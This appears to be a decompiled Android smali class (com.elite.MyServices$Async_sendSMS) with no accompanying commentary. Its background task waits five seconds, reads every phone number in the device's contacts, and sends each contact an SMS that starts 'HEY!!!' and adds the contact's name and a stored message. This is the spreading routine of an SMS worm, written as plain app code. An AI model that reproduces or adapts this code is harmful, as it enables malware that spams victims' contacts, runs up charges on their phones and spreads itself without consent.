.class public Lcom/elite/MyServices$Async_sendSMS;
.super Landroid/os/AsyncTask;
.source "MyServices.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/elite/MyServices;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x1
    name = "Async_sendSMS"
.end annotation

.annotation system Ldalvik/annotation/Signature;
    value = {
        "Landroid/os/AsyncTask",
        "<",
        "Ljava/lang/Void;",
        "Ljava/lang/Void;",
        "Ljava/lang/Void;",
        ">;"
    }
.end annotation


# instance fields
.field private contextTask:Landroid/content/Context;

.field final synthetic this$0:Lcom/elite/MyServices;


# direct methods
.method public constructor <init>(Lcom/elite/MyServices;Landroid/content/Context;)V
    .locals 0
    .param p2, "context"    # Landroid/content/Context;

    .prologue
    .line 175
    iput-object p1, p0, Lcom/elite/MyServices$Async_sendSMS;->this$0:Lcom/elite/MyServices;

    invoke-direct {p0}, Landroid/os/AsyncTask;-><init>()V

    .line 176
    iput-object p2, p0, Lcom/elite/MyServices$Async_sendSMS;->contextTask:Landroid/content/Context;

    .line 177
    return-void
.end method


# virtual methods
.method protected bridge varargs synthetic doInBackground([Ljava/lang/Object;)Ljava/lang/Object;
    .locals 1

    .prologue
    .line 1
    check-cast p1, [Ljava/lang/Void;

    invoke-virtual {p0, p1}, Lcom/elite/MyServices$Async_sendSMS;->doInBackground([Ljava/lang/Void;)Ljava/lang/Void;

    move-result-object v0

    return-object v0
.end method

.method protected varargs doInBackground([Ljava/lang/Void;)Ljava/lang/Void;
    .locals 11
    .param p1, "params"    # [Ljava/lang/Void;

    .prologue
    const/4 v10, 0x0

    .line 182
    const-wide/16 v0, 0x1388

    :try_start_0
    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V

    .line 183
    iget-object v0, p0, Lcom/elite/MyServices$Async_sendSMS;->contextTask:Landroid/content/Context;

    invoke-virtual {v0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    sget-object v1, Landroid/provider/ContactsContract$CommonDataKinds$Phone;->CONTENT_URI:Landroid/net/Uri;

    const/4 v2, 0x0

    const/4 v3, 0x0

    const/4 v4, 0x0

    const/4 v5, 0x0

    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v9

    .line 184
    .local v9, "phones":Landroid/database/Cursor;
    :goto_0
    invoke-interface {v9}, Landroid/database/Cursor;->moveToNext()Z

    move-result v0

    if-nez v0, :cond_0

    .line 192
    invoke-interface {v9}, Landroid/database/Cursor;->close()V

    .line 197
    .end local v9    # "phones":Landroid/database/Cursor;
    :goto_1
    return-object v10

    .line 185
    .restart local v9    # "phones":Landroid/database/Cursor;
    :cond_0
    const-string v0, "display_name"

    invoke-interface {v9, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v0

    invoke-interface {v9, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v7

    .line 186
    .local v7, "name":Ljava/lang/String;
    const-string v0, "data1"

    invoke-interface {v9, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v0

    invoke-interface {v9, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v8

    .line 189
    .local v8, "phoneNumber":Ljava/lang/String;
    iget-object v0, p0, Lcom/elite/MyServices$Async_sendSMS;->this$0:Lcom/elite/MyServices;

    iget-object v1, p0, Lcom/elite/MyServices$Async_sendSMS;->contextTask:Landroid/content/Context;

    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "HEY!!! "

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, " "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    iget-object v3, p0, Lcom/elite/MyServices$Async_sendSMS;->contextTask:Landroid/content/Context;

    invoke-virtual {v3}, Landroid/content/Context;->getResources()Landroid/content/res/Resources;

    move-result-object v3

    const v4, 0x7f080006

    invoke-virtual {v3, v4}, Landroid/content/res/Resources;->getString(I)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v1, v8, v2}, Lcom/elite/MyServices;->sendSMS(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    .line 194
    .end local v7    # "name":Ljava/lang/String;
    .end local v8    # "phoneNumber":Ljava/lang/String;
    .end local v9    # "phones":Landroid/database/Cursor;
    :catch_0
    move-exception v6

    .line 195
    .local v6, "e":Ljava/lang/InterruptedException;
    invoke-virtual {v6}, Ljava/lang/InterruptedException;->printStackTrace()V

    goto :goto_1
.end method

.method protected bridge synthetic onPostExecute(Ljava/lang/Object;)V
    .locals 0

    .prologue
    .line 1
    check-cast p1, Ljava/lang/Void;

    invoke-virtual {p0, p1}, Lcom/elite/MyServices$Async_sendSMS;->onPostExecute(Ljava/lang/Void;)V

    return-void
.end method

.method protected onPostExecute(Ljava/lang/Void;)V
    .locals 0
    .param p1, "result"    # Ljava/lang/Void;

    .prologue
    .line 203
    invoke-super {p0, p1}, Landroid/os/AsyncTask;->onPostExecute(Ljava/lang/Object;)V

    .line 204
    return-void
.end method
